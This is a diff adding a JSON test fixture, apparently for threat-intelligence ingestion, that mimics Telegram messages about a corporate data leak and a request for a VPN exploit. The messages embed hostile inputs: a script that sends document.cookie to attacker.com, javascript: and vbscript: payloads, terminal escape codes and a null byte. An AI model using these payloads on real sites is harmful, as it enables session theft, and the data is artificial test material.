@@ -1,0 +1,52 @@
+{
+  "source_reference": "tg_channel_threat_actors_lounge",
+  "source_type": "telegram",
+  "channel_title": "Threat Actors Lounge & Leaks",
+  "channel_handle": "@threat_actors_lounge",
+  "messages": [
+    {
+      "message_id": "msg_9001",
+      "source_sequence_id": 101,
+      "broadcast_timestamp_utc": "2026-10-29T10:00:00Z",
+      "message_thread_id": "topic_ransomware",
+      "sender_username": "dark_operator_99",
+      "sender_native_id": "tg_user_11223344",
+      "raw_text": "New corporate breach announcement! 250GB leaked database dump available at http://victim-corp.onion/data. Download dump or contact admin at javascript:alert('xss')",
+      "reply_to_message_id": null,
+      "has_media": true
+    },
+    {
+      "message_id": "msg_9002",
+      "source_sequence_id": 102,
+      "broadcast_timestamp_utc": "2026-10-29T10:05:00Z",
+      "message_thread_id": "topic_ransomware",
+      "sender_username": "script_kiddie_hax",
+      "sender_native_id": "tg_user_55667788",
+      "raw_text": "Is this legit? <script>document.location='http://attacker.com/steal?c='+document.cookie</script> Check the hash list: <iframe src=\"vbscript:malicious()\"></iframe>",
+      "reply_to_message_id": "msg_9001",
+      "has_media": false
+    },
+    {
+      "message_id": "msg_9003",
+      "source_sequence_id": 103,
+      "broadcast_timestamp_utc": "2026-10-29T10:10:00Z",
+      "message_thread_id": "topic_ransomware",
+      "sender_username": "dark_operator_99",
+      "sender_native_id": "tg_user_11223344",
+      "raw_text": "Yes, confirmed samples verified. \u001b[31;1mCRITICAL LEAK:\u001b[0m 50k customer records containing emails and hashed passwords.\u0000",
+      "reply_to_message_id": "msg_9002",
+      "has_media": false
+    },
+    {
+      "message_id": "msg_9004",
+      "source_sequence_id": 104,
+      "broadcast_timestamp_utc": "2026-10-29T10:15:00Z",
+      "message_thread_id": "topic_general",
+      "sender_username": "spectator_01",
+      "sender_native_id": "tg_user_99887766",
+      "raw_text": "Anyone selling 0-day access for corporate VPN portals? Need Cisco AnyConnect exploit.",
+      "reply_to_message_id": null,
+      "has_media": false
+    }
+  ]
+}
